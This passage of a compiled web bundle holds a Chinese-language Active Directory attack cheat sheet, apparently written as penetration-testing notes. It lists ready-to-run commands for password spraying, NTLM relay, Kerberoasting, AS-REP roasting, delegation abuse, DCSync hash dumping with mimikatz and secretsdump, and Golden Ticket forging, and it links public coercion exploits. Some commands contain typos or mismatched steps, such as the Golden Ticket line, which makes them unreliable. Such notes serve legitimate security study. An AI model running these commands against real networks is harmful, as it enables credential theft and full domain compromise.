\u4e2d\u7e7c\u4f86\u64f4\u5c55\u653b\u64ca\u3002\u5b83\u5229\u7528\u57fa\u65bc\u8cc7\u6e90\u7684\u7d04\u675f\u59d4\u6d3e (RBCD) \u5728\u52a0\u5165\u7db2\u57df\u7684 Windows \u5de5\u4f5c\u7ad9\u4e0a\u505a LPE\uff0c\u540c\u6642\u4e5f\u91dd\u5c0d\u6c92\u6709 LDAP signature \u7684\u74b0\u5883\u3002"}),"\n"]}),"\n",(0,l.jsx)(n.h2,{id:"password-spraying\u5bc6\u78bc\u5674\u7051",children:"Password Spraying(\u5bc6\u78bc\u5674\u7051)"}),"\n",(0,l.jsxs)(n.ul,{children:["\n",(0,l.jsx)(n.li,{children:"Recon\uff1acme, rpcclient, enum4linux, ldap, powerview... \u53d6\u5f97\u5e33\u865f"}),"\n",(0,l.jsx)(n.li,{children:"\u5df2\u77e5\u5f88\u591a\u5e33\u865f\uff0c\u5617\u8a66\u4e00\u7a2e\u5bc6\u78bc\u505a\u5617\u8a66"}),"\n"]}),"\n",(0,l.jsx)(n.h3,{id:"linux-2",children:"Linux"}),"\n",(0,l.jsxs)(n.ul,{children:["\n",(0,l.jsxs)(n.li,{children:["CrackMapExec\uff1a",(0,l.jsx)(n.a,{href:"https://github.com/byt3bl33d3r/CrackMapExec",children:"https://github.com/byt3bl33d3r/CrackMapExec"}),"\n",(0,l.jsxs)(n.ul,{children:["\n",(0,l.jsx)(n.li,{children:(0,l.jsx)(n.code,{children:"cme {protocol} {target(s)} -u <usernames_lists> -p <passwords_lists>"})}),"\n",(0,l.jsx)(n.li,{children:(0,l.jsx)(n.code,{children:"cme {protocol} {target(s)} -u <usernames_lists> -p <passwords_lists> --no-bruteforce"})}),"\n"]}),"\n"]}),"\n",(0,l.jsxs)(n.li,{children:["rpcclient\uff1a","\n",(0,l.jsxs)(n.ul,{children:["\n",(0,l.jsxs)(n.li,{children:["bash\uff1a",(0,l.jsx)(n.code,{children:'for u in $(cat valid_users.txt);do rpcclient -U "$u%Welcome1" -c "getusername;quit" <dc-ip> | grep Authority; done'}),"\n",(0,l.jsxs)(n.ul,{children:["\n",(0,l.jsxs)(n.li,{children:[(0,l.jsx)(n.code,{children:"grep Authority"})," \u662f\u7528\u4f86\u904e\u6ffe\u6709\u6548\u767b\u5165"]}),"\n"]}),"\n"]}),"\n"]}),"\n"]}),"\n",(0,l.jsxs)(n.li,{children:["kerbrute\uff1a","\n",(0,l.jsxs)(n.ul,{children:["\n",(0,l.jsx)(n.li,{children:(0,l.jsx)(n.code,{children:"kerbrute passwordspray -d <domain>.local --dc <dc-ip> valid_users.txt  <password>"})}),"\n"]}),"\n"]}),"\n",(0,l.jsxs)(n.li,{children:["sprayhound\n",(0,l.jsx)(n.code,{children:"sprayhound -U users.txt -d <domain> -dc <dc_ip> --lower"})]}),"\n"]}),"\n",(0,l.jsx)(n.h3,{id:"windows-2",children:"Windows"}),"\n",(0,l.jsxs)(n.ul,{children:["\n",(0,l.jsxs)(n.li,{children:[(0,l.jsx)(n.a,{href:"https://github.com/dafthack/DomainPasswordSpray",children:"https://github.com/dafthack/DomainPasswordSpray"}),"\n",(0,l.jsxs)(n.ul,{children:["\n",(0,l.jsx)(n.li,{children:(0,l.jsx)(n.code,{children:"Import-Module .\\DomainPasswordSpray.ps1"})}),"\n",(0,l.jsxs)(n.li,{children:[(0,l.jsx)(n.code,{children:"Invoke-DomainPasswordSpray -Password <password> -OutFile spray_success -ErrorAction SilentlyContinue"}),"\n",(0,l.jsxs)(n.ul,{children:["\n",(0,l.jsx)(n.li,{children:"\u5728\u7db2\u57df\u5167\u5674\u7051\u4e0d\u7528"}),"\n"]}),"\n"]}),"\n"]}),"\n"]}),"\n"]}),"\n",(0,l.jsx)(n.h2,{id:"smb-relay--ntlm-relay",children:"SMB Relay / NTLM Relay"}),"\n",(0,l.jsxs)(n.ul,{children:["\n",(0,l.jsxs)(n.li,{children:["Pre-work\uff1a",(0,l.jsx)(n.code,{children:"sudo vim /etc/responder/Responder.conf"}),"\n",(0,l.jsxs)(n.ul,{children:["\n",(0,l.jsx)(n.li,{children:(0,l.jsx)(n.code,{children:"SMB = Off"})}),"\n"]}),"\n"]}),"\n",(0,l.jsxs)(n.li,{children:["\u5217\u8209 ",(0,l.jsx)(n.strong,{children:"SMB signing disabled"})," \u6216 \u8a2d\u7f6e\u70ba ",(0,l.jsx)(n.strong,{children:'"not required"'})," \u7684 user\uff1a"]}),"\n"]}),"\n",(0,l.jsxs)(n.ol,{children:["\n",(0,l.jsx)(n.li,{children:(0,l.jsx)(n.code,{children:"nmap -sSV -p 445 -script smb2-security-mode <subnet>"})}),"\n",(0,l.jsx)(n.li,{children:(0,l.jsx)(n.code,{children:"crackmapexec smb <ip_or_ip_range> --gen-relay-list relay.txt"})}),"\n",(0,l.jsx)(n.li,{children:(0,l.jsx)(n.code,{children:"impacket-ntlmrelayx -tf relay.txtrelay.txt.txt -of netntlm -smb2support -socks"})}),"\n"]}),"\n",(0,l.jsxs)(n.ul,{children:["\n",(0,l.jsxs)(n.li,{children:["\u5df2\u77e5 NTLM Relay \u6f0f\u6d1e\uff1a","\n",(0,l.jsxs)(n.ul,{children:["\n",(0,l.jsx)(n.li,{children:(0,l.jsx)(n.a,{href:"https://github.com/Wh04m1001/DFSCoerce",children:"DFSCoerce"})}),"\n",(0,l.jsx)(n.li,{children:(0,l.jsx)(n.a,{href:"https://github.com/topotam/PetitPotam",children:"CVE-2021-36942 - PetitPotam"})}),"\n",(0,l.jsx)(n.li,{children:(0,l.jsx)(n.a,{href:"https://github.com/dirkjanm/krbrelayx/blob/master/printerbug.py",children:"Printer Bug (MS-RPRN \u6feb\u7528)"})}),"\n",(0,l.jsx)(n.li,{children:(0,l.jsx)(n.a,{href:"https://github.com/ThemeHackers/CVE-2024-21413",children:"https://github.com/ThemeHackers/CVE-2024-21413"})}),"\n",(0,l.jsx)(n.li,{children:(0,l.jsx)(n.a,{href:"https://github.com/Trackflaw/CVE-2023-23397",children:"https://github.com/Trackflaw/CVE-2023-23397"})}),"\n",(0,l.jsx)(n.li,{children:(0,l.jsx)(n.a,{href:"https://github.com/duy-31/CVE-2023-35636",children:"https://github.com/duy-31/CVE-2023-35636"})}),"\n"]}),"\n"]}),"\n"]}),"\n",(0,l.jsx)(n.h2,{id:"kerberoasting",children:"Kerberoasting"}),"\n",(0,l.jsxs)(n.ul,{children:["\n",(0,l.jsx)(n.li,{children:"\u63a7\u5236\u4efb\u4e00\u500b\u7db2\u57df\u4f7f\u7528\u8005\u5f8c\u53ef\u4ee5\u9032\u884c"}),"\n",(0,l.jsxs)(n.li,{children:["Recon (\u62ffuser name lists)\uff1a","\n",(0,l.jsxs)(n.ul,{children:["\n",(0,l.jsx)(n.li,{children:(0,l.jsx)(n.code,{children:"crackmapexec smb {ip} --users (smb username)"})}),"\n",(0,l.jsx)(n.li,{children:(0,l.jsx)(n.code,{children:"nmap -p 88 --script=krb5-enum-users --script-args=\"krb5-enum-users.realm='<domain>',userdb=<user.txt>\" <ip>"})}),"\n"]}),"\n"]}),"\n",(0,l.jsxs)(n.li,{children:["exploit\uff1a",(0,l.jsx)(n.code,{children:"impacket-GetUserSPNs {domain}\\{name}:{[password]} -dc-ip {dc-ip} -request -outputfile hash"})]}),"\n"]}),"\n",(0,l.jsx)(n.h2,{id:"as-rep-roasting",children:"AS-REP Roasting"}),"\n",(0,l.jsxs)(n.ul,{children:["\n",(0,l.jsx)(n.li,{children:(0,l.jsx)(n.code,{children:"GetNPUsers.py <Domain>/ -no-pass -usersfile <users_file>"})}),"\n"]}),"\n",(0,l.jsx)(n.h2,{id:"kerberos-delegation",children:"Kerberos Delegation"}),"\n",(0,l.jsxs)(n.ol,{children:["\n",(0,l.jsxs)(n.li,{children:["Unconstrained Delegation\n",(0,l.jsx)(n.img,{src:"https://hackmd.io/_uploads/H1I-QWtpC.png",alt:"image"})]}),"\n"]}),"\n",(0,l.jsxs)(n.blockquote,{children:["\n",(0,l.jsxs)(n.p,{children:["Graphic: Kerberos Unconstrained Delegation Communication Flow\n\u5716\u7247\u4f86\u6e90\uff1a",(0,l.jsx)(n.a,{href:"https://adsecurity.org/?p=1667",children:"https://adsecurity.org/?p=1667"})]}),"\n"]}),"\n",(0,l.jsxs)(n.ol,{start:"2",children:["\n",(0,l.jsxs)(n.li,{children:["Constrained Delegation","\n",(0,l.jsxs)(n.ul,{children:["\n",(0,l.jsx)(n.li,{children:"\u7d93\u904e\u6388\u6b0a\u7684\u5e33\u865f\uff0c\u53ef\u4ee5\u5728\u9650\u5236\u4e0b\u6a21\u64ec\u5b58\u53d6\u3001\u5beb\u5165\u5176\u5b83\u670d\u52d9\u3002"}),"\n",(0,l.jsx)(n.li,{children:"\u9700\u8981\u7ba1\u7406\u54e1\u6b0a\u9650"}),"\n"]}),"\n"]}),"\n",(0,l.jsx)(n.li,{children:"Resource Based Constrained Delegation(RBCD)"}),"\n"]}),"\n",(0,l.jsxs)(n.ul,{children:["\n",(0,l.jsxs)(n.li,{children:["Information gathering\uff1a",(0,l.jsx)(n.code,{children:"impacket-findDelegation {domain}/{user}:{password}"}),"\n",(0,l.jsxs)(n.ul,{children:["\n",(0,l.jsxs)(n.li,{children:[(0,l.jsx)(n.code,{children:"Constrained w/ Protocol Transition"})," ",(0,l.jsx)(n.code,{children:"CIFS/..."})]}),"\n"]}),"\n"]}),"\n",(0,l.jsxs)(n.li,{children:[(0,l.jsx)(n.code,{children:"impacket-getST -spn CIFS/... -impersonate administrator {domain}/{user}:{passowrd}"}),"\n",(0,l.jsxs)(n.ul,{children:["\n",(0,l.jsxs)(n.li,{children:["\u6a21\u64ec ",(0,l.jsx)(n.code,{children:"administrator"})," \u6b0a\u9650"]}),"\n"]}),"\n"]}),"\n"]}),"\n",(0,l.jsx)(n.h2,{id:"acl-abuse",children:"ACL Abuse"}),"\n",(0,l.jsx)(n.h3,{id:"acl-enum",children:"ACL Enum"}),"\n",(0,l.jsxs)(n.ul,{children:["\n",(0,l.jsx)(n.li,{children:(0,l.jsx)(n.code,{children:"Find-InterestingDomainAcl"})}),"\n",(0,l.jsx)(n.li,{}),"\n"]}),"\n",(0,l.jsx)(n.h2,{id:"dcsync",children:"DcSync"}),"\n",(0,l.jsxs)(n.ul,{children:["\n",(0,l.jsx)(n.li,{children:(0,l.jsx)(n.a,{href:"https://www.modb.pro/db/108846",children:"https://www.modb.pro/db/108846"})}),"\n"]}),"\n",(0,l.jsx)(n.admonition,{type:"info",children:(0,l.jsxs)(n.ul,{children:["\n",(0,l.jsxs)(n.li,{children:["\u672c\u5730\u5740\u7528\u8005\u8cc7\u6599\u5eab C:\\windows\\system32\\config\\SAM","\n",(0,l.jsxs)(n.ul,{children:["\n",(0,l.jsxs)(n.li,{children:["\u898b ",(0,l.jsx)(n.strong,{children:"Windows \u5f8c\u6ef2\u900f"})]}),"\n"]}),"\n"]}),"\n",(0,l.jsxs)(n.li,{children:["\u7db2\u57df\u4f7f\u7528\u8005\u8cc7\u6599\u5eab C:\\Windows\\NTDS\\NTDS.dit","\n",(0,l.jsxs)(n.ul,{children:["\n",(0,l.jsxs)(n.li,{children:[(0,l.jsx)(n.strong,{children:"DcSync"})," \u5c31\u662f\u628a ",(0,l.jsx)(n.strong,{children:"NTDS.dit"})," \u7684\u8cc7\u6599\u5c0e\u51fa\u4f86"]}),"\n"]}),"\n"]}),"\n"]})}),"\n",(0,l.jsxs)(n.ul,{children:["\n",(0,l.jsxs)(n.li,{children:["\u767c\u52d5\u689d\u4ef6\uff1a\u6709 ",(0,l.jsx)(n.strong,{children:"Domain Admin"})," \u6b0a\u9650 \u6216 \u5177\u6709",(0,l.jsx)(n.code,{children:"Replicating Directory Changes"})," \u6216 ",(0,l.jsx)(n.code,{children:"Replicating Directory Changes All"})," \u624d\u80fd\u61c9\u7528\u6b64\u653b\u64ca (\u64c1\u6709 Administrators\u3001Domain Controllers \u6216 Enterprise Domain Admins \u7fa4\u7d44\u5167\u7684\u4f7f\u7528\u8005\u6b0a\u9650)"]}),"\n"]}),"\n",(0,l.jsx)(n.h3,{id:"dumping-hash",children:"Dumping Hash"}),"\n",(0,l.jsxs)(n.ul,{children:["\n",(0,l.jsxs)(n.li,{children:["cme\uff1a",(0,l.jsx)(n.code,{children:"nxc smb <dc_ip> -H <hash> -d <domain> -u <username> --ntds"})]}),"\n",(0,l.jsxs)(n.li,{children:["Mimikatz","\n",(0,l.jsxs)(n.ul,{children:["\n",(0,l.jsxs)(n.li,{children:["\u5207\u5230 Domain Admin \u5e33\u6236 (\u6703\u5f48\u51fa\u65b0\u7684 cmd \u8996\u7a97)","\n",(0,l.jsxs)(n.ol,{children:["\n",(0,l.jsx)(n.li,{children:(0,l.jsx)(n.code,{children:"privilege::debug"})}),"\n",(0,l.jsx)(n.li,{children:(0,l.jsx)(n.code,{children:"sekurlsa::pth /user:<username> /domain:<domain> /ntlm:<ntlm>"})}),"\n",(0,l.jsxs)(n.li,{children:["\u518d\u555f\u7528\u5f8c\uff1a",(0,l.jsx)(n.code,{children:"lsadump::dcsync /all"})]}),"\n"]}),"\n"]}),"\n"]}),"\n"]}),"\n",(0,l.jsxs)(n.li,{children:["secretsdump","\n",(0,l.jsxs)(n.ul,{children:["\n",(0,l.jsx)(n.li,{children:(0,l.jsx)(n.code,{children:"python3 impacket-secretsdump <Domain>/administrator:<Domiain_admin_password>@<ip> -dc-ip <dc_ip> -just-dc-user administrator"})}),"\n"]}),"\n"]}),"\n"]}),"\n",(0,l.jsx)(n.h3,{id:"generating-golden-ticket",children:"Generating Golden ticket"}),"\n",(0,l.jsxs)(n.ul,{children:["\n",(0,l.jsxs)(n.li,{children:["\n",(0,l.jsx)(n.p,{children:"Golden Ticket \u662f\u4e00\u7a2e\u7279\u6b0a Kerberos TGT\uff08Ticket Granting Ticket\uff09\uff0c\u5141\u8a31\u653b\u64ca\u8005\u5047\u5192\u57df\u5167\u7684\u4efb\u4f55\u7528\u6236\uff0c\u4e26\u5728\u57df\u5167\u64c1\u6709\u6700\u9ad8\u6b0a\u9650\u3002"}),"\n"]}),"\n",(0,l.jsxs)(n.li,{children:["\n",(0,l.jsx)(n.p,{children:"\u900f\u904e\u4e0a\u8ff0 Dumping Hash \u653b\u64ca\u7372\u5f97 (krbtgt\u7684) NTLM hash \u4e4b\u5f8c\uff0c\u63a5\u8457\u53ef\u4ee5\u88fd\u4f5c Golden Ticket"}),"\n"]}),"\n",(0,l.jsxs)(n.li,{children:["\n",(0,l.jsx)(n.p,{children:"On Windows\uff1a"}),"\n",(0,l.jsxs)(n.ul,{children:["\n",(0,l.jsxs)(n.li,{children:["mimikatz\uff1a","\n",(0,l.jsxs)(n.ul,{children:["\n",(0,l.jsx)(n.li,{children:(0,l.jsx)(n.code,{children:"lsadump::dcsync /domain:<domain> /user:krbtgt"})}),"\n",(0,l.jsxs)(n.li,{children:["\u751f\u6210\uff1a",(0,l.jsx)(n.code,{children:"sekurlsa::pth /user:administrator /domain:example.com /ntlm:KRBTGT_NTLM_HASH /sid:S-1-5-21-XXXXXXX-XXXXXXX-XXXXXXX /target:example.com /groups:513 /ticket:golden.kirbi"})]}),"\n",(0,l.jsxs)(n.li,{children:["\u6ce8\u5165 Golden Ticket\uff1a",(0,l.jsx)(n.code,{children:"kerberos::ptt golden.kirbi"})]}),"\n",(0,l.jsx)(n.li,{children:"\u6210\u529f\u62ff\u4e0b\u6700\u9ad8\u6b0a\u9650"}),"\n"]}),"\n"]}),"\n"]}),"\n"]}),"\n",(0,l.jsxs)(n.li,{children:["\n",(0,l.jsx)(n.p,{children:"On Linux\uff1a\nsecretsdump \u5229\u7528\u76ee\u9304\u8907\u88fd\u670d\u52d9\u9060\u7a0b\u5354\u8b70 (MS-DRSR)\uff0c\u4e5f\u5c31\u662f DCSync \u6240\u4f9d\u8cf4\u7684\u5354\u8b70\uff0c\u4f86\u6a21\u64ec\u57df\u63a7\u5236\u5668\u4e4b\u9593\u7684\u8907\u88fd\u884c\u70ba\uff0c\u5f9e\u800c\u8acb\u6c42\u6307\u5b9a\u57df\u63a7\u5236\u5668\u4e0a\u7684\u5e33\u6236 NTLM"}),"\n",(0,l.jsxs)(n.ul,{children:["\n",(0,l.jsxs)(n.li,{children:["\n",(0,l.jsxs)(n.p,{children:[(0,l.jsx)(n.code,{children:"impacket-secretsdump '<DOMAIN>/<USERNAME>:<PASSWORD>@<DC_IP_OR_HOSTNAME>' -just-dc"}),"\n",(0,l.jsx)(n.img,{src:"https://hackmd.io/_uploads/ByPu9cEAyx.png",alt:"image"})]}),"\n"]}),"\n",(0,l.jsxs)(n.li,{children:["\n",(0,l.jsxs)(n.p,{children:["or PTH\uff1a",(0,l.jsx)(n.code,{children:"impacket-secretsdump '<DOMAIN>/<USERNAME>@<DC_IP_OR_HOSTNAME>' -hashes <LM_HASH>:<NTLM_HASH> -just-dc"})]}),"\n"]}),"\n",(0,l.jsxs)(n.li,{children:["\n",(0,l.jsxs)(n.p,{children:["SID Extraction\uff1a",(0,l.jsx)(n.code,{children:"impacket-lookupsid:<DOMAIN>/<USERNAME>:'<PASSWORD>'@<DC_IP_OR_HOSTNAME>"}),"\n",(0,l.jsx)(n.img,{src:"https://hackmd.io/_uploads/SJMoysEAJg.png",alt:"image"})]}),"\n"]}),"\n",(0,l.jsxs)(n.li,{children:["\n",(0,l.jsx)(n.p,{children:"\u9700\u8981\u4e00\u500b\u6709\u6548\u7684 Kerberos TGT ticket\uff0c\u4e26\u5c07\u5176\u4fdd\u5b58\u5728 ccache)\u3002"}),"\n",(0,l.jsxs)(n.ul,{children:["\n",(0,l.jsx)(n.li,{children:"\u901a\u5e38\u901a\u904e kinit (\u5982\u679c\u77e5\u9053\u5bc6\u78bc\u6216\u6709 keytab) \u6216\u5176\u4ed6\u653b\u64ca\u624b\u6bb5\uff08\u5982 Kerberoasting\uff09\u7372\u5f97\u3002"}),"\n",(0,l.jsx)(n.li,{children:(0,l.jsx)(n.code,{children:"export KRB5CCNAME=/path/to/your/ticket.ccache"})}),"\n"]}),"\n"]}),"\n"]}),"\n"]}),"\n"]}),"\n",(0,l.jsx)(n.h2,{id:"attacking-domain-trust",children:"Attacking Domain Trust"})]})}function x(e={}){const{wrapper:n}={...(0,r.R)(),...e.components};return n?(0,l.jsx)(n,{...e,children:(0,l.jsx)(t,{...e})}):t(e)}},8453:(e,n,s)=>{s.d(n,{R:()=>d,x:()=>c});var i=s(6540);const l={},r=i.createContext(l);function d(e){const n=i.useContext(r);return i.useMemo((function(){return"function"==typeof e?e(n):{...n,...e}}),[n,e])}function c(e){let n;return n=e.disableParentContext?"function"==typeof e.components?e.components(l):e.components||l:d(e.components),i.createElement(r.Provider,{value:n},e.children)}}}]);